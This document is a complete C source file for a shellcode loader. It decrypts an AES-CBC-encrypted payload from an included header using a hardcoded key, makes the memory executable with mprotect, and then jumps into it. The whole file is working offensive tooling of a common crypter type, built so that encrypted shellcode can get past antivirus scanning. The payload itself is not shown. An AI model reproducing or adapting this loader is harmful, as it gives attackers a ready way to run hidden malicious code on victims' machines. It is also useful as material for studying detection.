#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include "aes.h"
#include "payload-dec.h"
#define CBC 1

static void make_rwx(void *p, size_t n) {
    long pg = sysconf(_SC_PAGESIZE);
    uintptr_t start = (uintptr_t)p & ~(pg - 1);
    uintptr_t end   = ((uintptr_t)p + n + pg - 1) & ~(pg - 1);
    if (mprotect((void *)start, end - start, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect"); _exit(1);
    }
    __builtin___clear_cache((char *)p, (char *)p + n);
}

int main()
{
	size_t shellcodeSize = sizeof(code) -1;

	unsigned char key[] = "0123456789abcdef0123456789abcdef";
	unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, code, shellcodeSize);

	printf("Decrypted Shellcode: \n");

	for (int i = 0; i < shellcodeSize; i++) {
		printf("\\x%02x", code[i]);
	}
  make_rwx(code, sizeof(code));
	printf("\n\nExecuting Shellcode...\n");

  void (*run)(void) = (void (*)(void))code;
  run();
}

